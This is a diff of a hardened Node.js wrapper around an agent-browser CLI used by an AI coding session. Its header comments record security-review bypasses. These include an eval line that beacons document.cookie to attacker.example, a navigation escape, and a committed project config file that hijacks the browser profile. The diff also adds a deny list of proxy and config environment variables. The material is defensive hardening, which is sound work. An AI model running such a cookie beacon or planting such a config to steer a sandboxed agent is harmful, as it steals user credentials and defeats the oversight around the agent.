@@ -1,7 +1,7 @@
 #!/usr/bin/env node
 // _agent-browser-safe.mjs — hardened agent-browser wrapper, reached via
 // `maude design agent-browser-safe <subcommand> [args...]` (DDR-062 dispatch;
-// DDR-185 security addendum, round 2).
+// DDR-185 security addendum, round 3).
 //
 // WHY THIS EXISTS: DDR-185 originally added a bare `Bash(agent-browser:*)`
 // allow-list entry so the ACP session wouldn't prompt on the raw
@@ -13,63 +13,115 @@
 // recommends a PERSISTENT Chrome profile as the default auth strategy for
 // real, cross-origin authenticated sites (GitHub, production, ClickUp).
 //
-// ROUND 2: this file's FIRST hardening pass allowlisted the subcommand but
-// only REJECTED a specific list of known-dangerous flags in the remaining
-// argv (`--profile`/`--cdp`/etc.). A follow-up verification pass found (a)
-// the env-clearing list was a strict subset of the flag reject-list — three
-// documented env-var equivalents of already-rejected flags
-// (`AGENT_BROWSER_AUTO_CONNECT`, `AGENT_BROWSER_PROXY`/`HTTP_PROXY`/
-// `HTTPS_PROXY`/`ALL_PROXY`, `AGENT_BROWSER_ENGINE`) were never cleared, so
-// an ordinary ambient env var (a corporate proxy, or a value the user set
-// for their own terminal use) leaked straight through; and (b) a further
-// `--help` read surfaced `-p`/`--provider <name>` — routes the ENTIRE
-// session through a remote cloud browser (browserbase/kernel/browserless/
-// agentcore) instead of local Chrome — which was never in the reject list
-// at all. Both are instances of the SAME root problem `_curl-local.mjs`'s
-// own round-2 rewrite diagnoses: enumerating "known-dangerous flags" against
-// a third-party CLI's evolving surface is an unbounded chase, not a fix.
+// ROUND 3 — a live adversarial re-check of round 2 found TWO further real
+// bypasses, both live-confirmed against the real `agent-browser` binary:
 //
-// So this file, like curl-local, no longer tries to allowlist/rejectlist
-// FLAGS at all. Each allowed subcommand has a FIXED positional-argument
-// arity (open=1, eval=1, screenshot=0-1, snapshot=0, get=1-2, wait=1,
-// close=0); ANY additional argv token beyond that arity — flag or not, `-`
-// prefixed or not — is rejected outright. There is no flag concept left for
-// the caller to reach at all, so `--provider`/`-p`, or any FUTURE flag
-// neither round of review thought to name, cannot recur here by
-// construction. (An eval expression that legitimately starts with `-`, e.g.
-// `agent-browser-safe eval "-1 + 2"`, still works — it's exactly the ONE
-// expected positional value for `eval`, never scanned for a leading dash.)
+//   1. **`eval` defeats `--allowed-domains` entirely — a navigation gate is
+//      not a network-egress firewall.** `--allowed-domains` only restricts
+//      `agent-browser open <url>` (a top-level navigation). It installs NO
+//      in-page network policy. Any JS handed to `eval` runs with none of
+//      that restriction: `eval "window.location.href='https://real-site'"`
+//      simply navigates around the gate (live-confirmed: a subsequent `get
+//      url` showed the escaped origin), and even without navigating,
+//      `eval "fetch('https://attacker.example/c?d='+document.cookie,
+//      {mode:'no-cors'})"` beacons out directly — a no-cors fetch is
+//      confirmed to actually leave the machine (`type:'opaque'`,
+//      `status:0`) with no read-back needed to exfiltrate. There is no
+//      argv-level fix for this: `eval` IS arbitrary JS execution in page
+//      context, and network reach is inherent to that, not a separate flag
+//      to strip. Mirrors this DDR's own `find` precedent exactly ("neither
+//      residual is fixable via prefix-matching... cut it, don't patch it")
+//      — **`eval` is REMOVED from `ALLOWED_SUBCOMMANDS`.** The two
+//      documented call sites that used it (`motion-critic.md`, `edit.md`)
+//      revert to raw `agent-browser eval` — which still prompts for
+//      confirmation, exactly like every OTHER un-listed command. This is
+//      the pre-DDR-185 status quo for those two specific calls, not a new
+//      regression.
+//   2. **`./agent-browser.json` project-config auto-discovery bypassed
+//      EVERY CLI-flag and env-var protection in round 1/2, with ZERO flags
+//      or env vars touched at all.** agent-browser's own `--help`
+//      documents a 4-tier config precedence: `~/.agent-browser/config.json`
+//      → **`./agent-browser.json` (project-level, discovered from CWD)** →
+//      env vars → CLI flags. The ACP session's `cwd` is `repoRoot` — the
+//      DDR-054 UNTRUSTED project root. Live-confirmed: a plain
+//      `agent-browser.json` file (`{"profile":"./hijacked-profile"}`)
+//      committed at repo root is auto-discovered and honored on the very
+//      next `agent-browser-safe` call, with no model complicity needed at
+//      all — the file alone does the work. This is a confused-deputy
+//      primitive round 1/2 never considered (they only modeled CLI
+//      flags/env vars as the attack surface). **Fixed**: `--config
+//      <Maude-owned-empty-file>` is now forced on every spawn — per
+//      agent-browser's own docs, `--config <path>` REPLACES the entire
+//      default discovery chain (both the user-level AND project-level
+//      files) with the one file named, so `./agent-browser.json` is never
+//      read. `AGENT_BROWSER_CONFIG` also added to `CLEARED_ENV_KEYS`
+//      (defense in depth against an ambient env override of the config
+//      path itself).
+//
+// The wrapper's own effectiveness is now verified two ways, not one: an
+// argv-parsing unit-test suite (`_agent-browser-safe.test.mjs`), AND this
+// file's own comments record the LIVE runtime behavior each fix was
+// confirmed against — the round-2 verification pass's own finding was that
+// round 1 was validated only at the argv layer, never against what the real
+// binary's OWN config/transport surface actually does.
+//
+// ROUND 2 (superseded in shape, kept for the record): the first hardening
+// pass allowlisted the subcommand but only REJECTED a specific list of
+// known-dangerous flags in the remaining argv. A follow-up found the
+// env-clearing list was a strict subset of the flag reject-list, and a
+// further `--help` read surfaced `-p`/`--provider <name>` (routes the
+// session through a remote cloud browser) which was never in the reject
+// list at all. Both were instances of the same root problem `_curl-local.mjs`
+// diagnoses: enumerating "known-dangerous flags" against a third-party
+// CLI's evolving surface is an unbounded chase. Fixed by replacing the flag
+// reject-list with a FIXED positional-argument arity per subcommand — ANY
+// additional argv token beyond that arity, flag-shaped or not, is rejected.
+// There is no flag concept left for the caller to reach at all, so
+// `--provider`/`-p`, or any future CLI flag neither review round thought to
+// name, cannot recur here by construction.
 //
 //   1. The subcommand (argv[0], REQUIRED to be first) must be one of:
-//      open/eval/screenshot/snapshot/get/wait/close. Nothing that reads
-//      cookies/clipboard/storage, attaches to an already-running Chrome,
-//      routes through a remote provider, uploads/downloads files, or spawns
-//      the `chat` sub-agent is reachable through this wrapper at all.
+//      open/screenshot/snapshot/get/wait/close. Nothing that reads
+//      cookies/clipboard/storage, executes arbitrary JS, attaches to an
+//      already-running Chrome, routes through a remote provider,
+//      uploads/downloads files, or spawns the `chat` sub-agent is reachable
+//      through this wrapper at all.
 //   2. The remaining argv must match that subcommand's fixed arity exactly
 //      — no more, no fewer.
 //   3. The real `agent-browser` child is spawned with `--allowed-domains
-//      localhost,127.0.0.1` forced (agent-browser's own native domain-scope
-//      enforcement — verified live: `agent-browser open https://example.com`
-//      through this wrapper is refused by agent-browser itself), AND every
-//      profile/session/policy/proxy/engine env var agent-browser's own
-//      `--help` documents (not just the ones a prior CLI-flag reject-list
-//      happened to name) explicitly cleared before spawning — regardless of
-//      what the user's own `~/.claude/settings.json` or shell rc ambiently
-//      sets (DDR-144's `settingSources:['user']` legitimately still reads
-//      those for the user's own manual terminal use; this wrapper's env
-//      deletion is what stops that from leaking into the auto-approving ACP
-//      session specifically).
+//      localhost,127.0.0.1` AND `--config <empty-file>` forced (the latter
+//      closing the project-config discovery chain per round 3, finding 2),
+//      AND every profile/session/policy/proxy/engine/config env var
+//      agent-browser's own `--help` documents explicitly cleared before
+//      spawning — regardless of what the user's own `~/.claude/settings.json`
+//      or shell rc ambiently sets (DDR-144's `settingSources:['user']`
+//      legitimately still reads those for the user's own manual terminal
+//      use; this wrapper's env deletion is what stops that from leaking
+//      into the auto-approving ACP session specifically).
 //
 // Exit: agent-browser's own exit code on success · 2 usage/rejected argv ·
 //       1 other (failed to spawn agent-browser at all).
 
 import { spawnSync } from 'node:child_process';
-import { pathToFileURL } from 'node:url';
+import { dirname, join } from 'node:path';
+import { fileURLToPath, pathToFileURL } from 'node:url';
+
+const HERE = dirname(fileURLToPath(import.meta.url));
+// A fixed, empty, valid-JSON config file this wrapper always points
+// agent-browser at — per agent-browser's own docs, `--config <path>`
+// REPLACES its entire default discovery chain (user-level AND
+// project-level `./agent-browser.json`) with the one file named, so a
+// project-root config file (DDR-054 untrusted content) can never be
+// auto-discovered. Must stay valid JSON — agent-browser exits with an
+// error if `--config` points to a missing/invalid file.
+const EMPTY_CONFIG_PATH = join(HERE, '_agent-browser-safe-config.json');
 
 // [minArgs, maxArgs] positional arguments AFTER the subcommand itself.
+// `eval` is deliberately NOT here — see the round-3 header comment: it
+// grants arbitrary JS execution (inherently including network/navigation
+// reach) that no argv-level check can constrain.
 export const SUBCOMMAND_ARITY = Object.freeze({
   open: [1, 1],
-  eval: [1, 1],
   screenshot: [0, 1],
   snapshot: [0, 0],
   get: [1, 2],
@@ -80,13 +132,12 @@ export const SUBCOMMAND_ARITY = Object.freeze({
 export const ALLOWED_SUBCOMMANDS = Object.freeze(Object.keys(SUBCOMMAND_ARITY));
 
 // Env vars agent-browser's own `--help` documents as controlling
-// profile/session/policy/proxy/engine behavior — every one of them is an
-// env-var equivalent of a capability this wrapper's subcommand/arity model
-// already refuses to let the caller reach via a flag, so none of them may
-// leak through from the ambient environment either. Cleared (deleted, not
-// empty-string — agent-browser validates an explicit empty session name as
-// invalid rather than unset), not just the profile/session/policy trio the
-// first pass covered.
+// profile/session/policy/proxy/engine/config behavior — every one of them
+// is an env-var equivalent of a capability this wrapper's subcommand/arity
+// model already refuses to let the caller reach via a flag, so none of them
+// may leak through from the ambient environment either. Cleared (deleted,
+// not empty-string — agent-browser validates an explicit empty session name
+// as invalid rather than unset).
 export const CLEARED_ENV_KEYS = Object.freeze([
   'AGENT_BROWSER_PROFILE',
   'AGENT_BROWSER_SESSION_NAME',
@@ -95,6 +146,7 @@ export const CLEARED_ENV_KEYS = Object.freeze([
   'AGENT_BROWSER_CONFIRM_INTERACTIVE',
   'AGENT_BROWSER_AUTO_CONNECT',
   'AGENT_BROWSER_ENGINE',
+  'AGENT_BROWSER_CONFIG',
   'AGENT_BROWSER_PROXY',
   'HTTP_PROXY',
   'HTTPS_PROXY',
@@ -125,12 +177,16 @@ Usage:
   maude design agent-browser-safe <subcommand> [args...]
 
 Allowed subcommands (fixed argument count, NO flags of any kind):
-  open <url>              screenshot [path]        get <thing> [selector]
-  eval <js>                snapshot                 wait <sel|ms>
-                                                      close
+  open <url>               snapshot                 wait <sel|ms>
+  screenshot [path]         get <thing> [selector]    close
 
-Forces --allowed-domains localhost,127.0.0.1 and a non-persistent profile,
-regardless of any ambient AGENT_BROWSER_*/*_PROXY environment.
+NOTE: "eval" is intentionally NOT supported — it grants arbitrary JS
+execution with network/navigation reach no argv check can constrain. Use
+raw \`agent-browser eval\` (which will prompt for confirmation) instead.
+
+Forces --allowed-domains localhost,127.0.0.1 and --config <empty file>
+(blocking project-level agent-browser.json auto-discovery), regardless of
+any ambient AGENT_BROWSER_*/*_PROXY environment.
 
 Exit: agent-browser's own exit code · 2 usage/rejected argv · 1 other.`;
 
@@ -151,7 +207,7 @@ function main() {
   env.AGENT_BROWSER_ALLOWED_DOMAINS = 'localhost,127.0.0.1';
   const result = spawnSync(
     'agent-browser',
-    [sub, ...rest, '--allowed-domains', 'localhost,127.0.0.1'],
+    ['--config', EMPTY_CONFIG_PATH, sub, ...rest, '--allowed-domains', 'localhost,127.0.0.1'],
     { stdio: 'inherit', env }
   );
   if (result.error) {
